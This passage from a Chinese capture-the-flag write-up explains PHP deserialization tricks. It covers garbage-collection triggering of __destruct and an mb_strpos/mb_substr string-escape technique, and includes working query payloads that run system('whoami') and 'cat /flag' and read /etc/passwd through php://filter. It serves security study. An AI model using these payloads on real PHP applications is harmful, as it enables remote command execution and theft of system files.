class="hljs-string">&quot;;s:6:&quot;</span>hacker<span class="hljs-string">&quot;;s:8:&quot;</span>username<span class="hljs-string">&quot;;R:9;&#125;i:1;N;&#125;&#125;&#125;&#125;&quot;</span>;s:3:<span class="hljs-string">&quot;end&quot;</span>;N;s:8:<span class="hljs-string">&quot;username&quot;</span>;s:6:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>显然，前面的 <code>O:6:&quot;Hacker&quot;:3:&#123;s:5:&quot;start&quot;;s:218:&quot;&#123;&#123;&#123;</code> 这部分并不是我们需要的，必须截掉，因此传入</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">substr</span>=<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0<span class="hljs-variable">%9fab</span><br></code></pre></td></tr></table></figure><p>把前面没用的38个字符截掉</p><p>最终传入</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">substr</span>=<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0<span class="hljs-variable">%9fab</span>&amp;ez[ser.from_you=a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;t&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;f&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;system(&quot;</span>whoami<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;R:<span class="hljs-number">9</span>;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>成功执行whoami命令</p><p>读flag：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">substr</span>=<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0<span class="hljs-variable">%9fab</span>&amp;ez[ser.from_you=a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;t&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;f&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;system(&quot;</span>cat /flag<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;R:<span class="hljs-number">9</span>;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="PHP-GC回收机制"><a href="#PHP-GC回收机制" class="headerlink" title="PHP GC回收机制"></a>PHP GC回收机制</h3><h4 id="PHP-GC-回收机制是什么"><a href="#PHP-GC-回收机制是什么" class="headerlink" title="PHP GC 回收机制是什么"></a>PHP GC 回收机制是什么</h4><p>用来提前触发__destruct</p><p> 在 PHP 中，是拥有垃圾回收机制 Garbage collection 的，也就是我们常说的 GC 机制的，在 PHP 中使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为 NULL ，或者没有任何指针指向时，它就会被变成垃圾，被 GC 机制自动回收掉；那么当一个对象没有了任何引用之后，就会被回收，在回收过程中，就会自动调用对象中的 <code>__destruct()</code> 方法。</p><ul><li>上面这一段话我个人认为如果零基础看，会感觉到相当抽象。所以我们先来解读一下</li></ul><p><strong>PHP 引用计数</strong></p><p>当我们 PHP 创建一个变量时，这个变量会被存储在一个名为 zval 的变量容器中。在这个 zval 变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。</p><p>第一个字节名为 <code>is_ref</code>，是 bool 值，它用来标识这个变量是否是属于引用集合。PHP 引擎通过这个字节来区分普通变量和引用变量，由于 PHP 允许用户使用 <code>&amp;</code> 来使用自定义引用，zval 变量容器中还有一个内部引用计数机制，来优化内存使用。</p><p>第二个字节是 <code>refcount</code>，它用来表示指向 zval 变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用域。</p><p>接下来看看例子：</p><p>容器的生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test&quot;</span>; <br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>下来添加一个引用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test&quot;</span>; <br><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里的话 a 的 <code>refcount</code> 应该是 1，<code>is_ref</code> 应该是 true，验证一下</p><p><a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_2.png"><img src="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_2.png" alt="img"></a></p><p>结果不同于我们所想的，这是为什么呢？</p><p>因为同一变量容器被变量 a 和变量 b 关联，当没必要时，php 不会去复制已生成的变量容器。 所以这一个 <code>zval</code> 容器存储了 a 和 b 两个变量，就使得 <code>refcount</code> 的值为 2。</p><p>容器的销毁：</p><p>当函数执行结束或者对变量调用了 <code>unset()</code> 函数，refcount 就会减 1。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;test&quot;</span>; <br><span class="hljs-variable">$b</span> =&amp;<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span> =&amp;<span class="hljs-variable">$b</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="PHP-GC-回收机制攻击面"><a href="#PHP-GC-回收机制攻击面" class="headerlink" title="PHP GC 回收机制攻击面"></a>PHP GC 回收机制攻击面</h4><ul><li>原理：当 <code>is_ref</code> 减少时，会触发 <code>__destuct</code> 魔术方法，由此产生的一些 trick 类型攻击</li></ul><p>变量被<code>unset</code>函数处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">php<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>; <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num = <span class="hljs-variable">$num</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;num.<span class="hljs-string">&quot;__construct&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>; <br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;num.<span class="hljs-string">&quot;__destruct()&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>; <br>    &#125;<br>    &#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-number">1</span>); <br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-number">2</span>); <br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p><a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_4.png"><img src="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_4.png" alt="img"></a></p><p>当对象为<code>NULL</code>时也是可以触发<code>__destruct</code>的。</p><p>在一个 array 里面存在一个键值对，value 为某个类，当这个类为 NULL 的时候，会被认为是 <code>is_ref</code> 为 0，也就是 false。这就可以触发到 <code>__destruct</code> 方法</p><p>样例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;test_flag&#125;&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这里因为有异常处理，所以正常情况下是无法<code>__destruct</code>，这时我们就需要利用GC回收机制来触发<code>__destruct</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>  &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-keyword">new</span> B,<span class="hljs-string">&#x27;b&#x27;</span>=&gt;<span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;b&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>得到序列化文本如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">plaintext<br><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;N;&#125;<br>对象类型:对象个数:&#123;类型:长度:键名;类型:长度:类名:值类型:长度:键名;类型;&#125;<br>数组:对象个数为<span class="hljs-number">2</span>:&#123;str型:长度<span class="hljs-number">1</span>:键名为<span class="hljs-string">&quot;a&quot;</span>;类:长度为<span class="hljs-number">1</span>:类名为<span class="hljs-string">&quot;B&quot;</span>:值为<span class="hljs-number">0</span> str型:值为<span class="hljs-number">1</span>:键名为<span class="hljs-string">&quot;b&quot;</span>:NULL型;&#125;<br></code></pre></td></tr></table></figure><p>这时我们将键名<code>b</code>改成<code>a</code>，即在反序列化时，会下先让<code>a</code>赋值为类<code>B</code>，之后再将<code>a</code>赋值为<code>NULL</code>，但一开始<code>a</code>已经是对象了，赋值为<code>NULL</code>时就会出现对象为<code>NULL</code>的情况，从而触发<code>__destruct</code>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">plaintext</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p><a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_5.png"><img src="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_5.png" alt="img"></a></p><p>这个是在反序列化中经常使用的方法。</p><h3 id="字符串逃逸反序列化"><a href="#字符串逃逸反序列化" class="headerlink" title="字符串逃逸反序列化"></a>字符串逃逸反序列化</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">php<br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">read_file</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/etc/passwd&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;start=<span class="hljs-variable">$start</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;start == <span class="hljs-string">&quot;gxngxngxn&quot;</span>)&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;What you are reading is:&#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;start&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$readfile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">read_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;start&#x27;</span>]);<br>    <span class="hljs-variable">$read</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]:<span class="hljs-string">&quot;I_want_to_Read_flag&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$readfile</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ctf</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Start_Funny_CTF!!!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先是字符串逃逸反序列化</p><p>参考链接：<a href="https://blog.csdn.net/Sa1nZen/article/details/139046383">Web-逃跑大师–第二届黄河流域公安院校网络空间安全技能邀请赛</a></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livescript">plaintext<br>当以 <span class="hljs-string">\xF0</span> 开头的字节序列出现在 UTF-<span class="hljs-number">8</span> 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-<span class="hljs-number">8</span> 编码规范定义了以 <span class="hljs-string">\xF0</span> 开头的字节序列用于编码较大的 Unicode 字符。<br>不符合<span class="hljs-number">4</span>位的规则的话，mb_substr和mb_strpos执行存在差异：<br>(<span class="hljs-number">1</span>)mb_strpos遇到<span class="hljs-string">\xF0时，会把无效字节先前的字节视为一个字符，然后从无效字节重新开始解析</span><br>mb_strpos(<span class="hljs-string">&quot;\xf0\x9fAAA&lt;BB&quot;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>); <span class="hljs-comment">#返回4 \xf0\x9f视作是一个字节，从A开始变为无效字节 #A为\x41  上述字符串其认为是7个字节</span><br><br>(<span class="hljs-number">2</span>)mb_substr遇到<span class="hljs-string">\xF0时，会把无效字节当做四字节Unicode字符的一部分，然后继续解析</span><br>mb_substr(<span class="hljs-string">&quot;\xf0\x9fAAA&lt;BB&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">#&quot;\xf0\x9fAAA&lt;B&quot; \xf0\x9fAA视作一个字符 上述字符串其认为是5个字节</span><br><br>结论：mb_strpos相对于mb_substr来说，可以把索引值向后移动<br></code></pre></td></tr></table></figure><p>因此我们可以知道</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">plaintext<br>每发送一个<span class="hljs-variable">%f0abc</span>，mb_strpos认为是<span class="hljs-number">4</span>个字节，mb_substr认为是<span class="hljs-number">1</span>个字节，相差<span class="hljs-number">3</span>个字节<br>每发送一个<span class="hljs-variable">%f0</span><span class="hljs-variable">%9</span>fab<span class="hljs-punctuation">,</span>mb_strpos认为是<span class="hljs-number">3</span>个字节，mb_substr认为是<span class="hljs-number">1</span>个字节，相差<span class="hljs-number">2</span>个字节<br>每发送一个<span class="hljs-variable">%f0</span><span class="hljs-variable">%9</span>f<span class="hljs-variable">%9</span>fa<span class="hljs-punctuation">,</span>mb_strpos认为是<span class="hljs-number">2</span>个字节，mb_substr认为是<span class="hljs-number">1</span>个字节，相差<span class="hljs-number">1</span>个字节<br></code></pre></td></tr></table></figure><p>所以第一步是先在 <code>start</code> 里传入我们想要序列化的字符串，然后通过截取把前面的那些干扰字符去掉，从而能够控制 <code>filename</code>的值任意读文件。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery">plaintext<br>?read=<span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0abc</span><span class="hljs-meta">%f0</span><span class="hljs-meta">%9f</span><span class="hljs-meta">%9fa</span><span class="hljs-meta">%f0</span><span class="hljs-meta">%9f</span><span class="hljs-meta">%9fa</span>&amp;<span class="hljs-keyword">start</span>=O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;read_file&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;gxngxngxn&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">55</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><a href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_2_1.png"><img src="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_2_1.png" alt="img"></a></p><p>这只是第一步，后边要利用 <code>file_get_contents($this-&gt;filename);</code> 来rce。</p><p>参考链接：<a href="https://xz.aliyun.com/t/14690?time__1311=mqmx9QDtDQ0=ex0y34+g6YG8bou8xGIxx">【翻译】从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎（篇一）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> php反序列化 </tag>
            
            <tag> 特殊变量名传参 </tag>
            
            <tag> gc回收 </tag>
            
            <tag> 反序列化逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
